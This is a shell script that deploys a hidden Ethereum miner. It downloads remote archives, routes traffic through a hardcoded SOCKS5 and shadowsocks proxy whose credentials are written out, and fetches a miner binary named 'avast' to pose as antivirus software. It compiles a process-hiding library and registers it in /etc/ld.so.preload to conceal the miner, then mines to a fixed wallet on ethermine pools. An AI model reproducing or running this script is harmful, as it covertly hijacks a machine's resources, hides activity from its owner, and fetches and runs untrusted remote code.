#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

sudo apt install libpci3

sudo apt update

sudo apt install screen -y

sudo apt update

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 52.203.46.122:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "

./graftcp/graftcp wget https://github.com/renilo/bh/releases/download/AAAA/avast.tar.gz >/dev/null 2>&1

tar xvf avast.tar.gz >/dev/null 2>&1

chmod +x avast >/dev/null 2>&1

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

apt -y install shadowsocks-libev rng-tools

ss-local -s 52.203.46.122 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &

ph add avast

ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) 

sudo ./graftcp/graftcp ./avast -a ethash -w 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb -p stratum+tcp://us1.ethermine.org:4444 stratum+tcp://us2.ethermine.org:4444 -r $ip-BZ --nvidia 1
